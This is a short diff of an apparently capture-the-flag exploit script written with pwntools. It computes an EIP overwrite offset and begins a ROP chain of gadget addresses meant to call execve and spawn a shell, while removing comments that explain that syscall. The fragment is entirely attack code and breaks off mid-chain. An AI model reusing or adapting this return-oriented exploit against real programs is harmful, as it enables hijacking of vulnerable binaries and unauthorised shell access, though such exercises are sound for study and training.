@@ -12,9 +12,6 @@ def exploit(r):
 	eip = cyclic_find(0x6261616b)
 	log.info("[+] to control eip : " + str(eip))
 	#attack
-	#execve("sh",NULL,NULL);
-	#syscall , parm1, parm2, parm3 , parm4
-	#execve(ebx,ecx,edx)
 	xoreax = p32(0x080512c0)
 	popedx = p32(0x080551ca)
 	popecx = p32(0x080e3c2a)
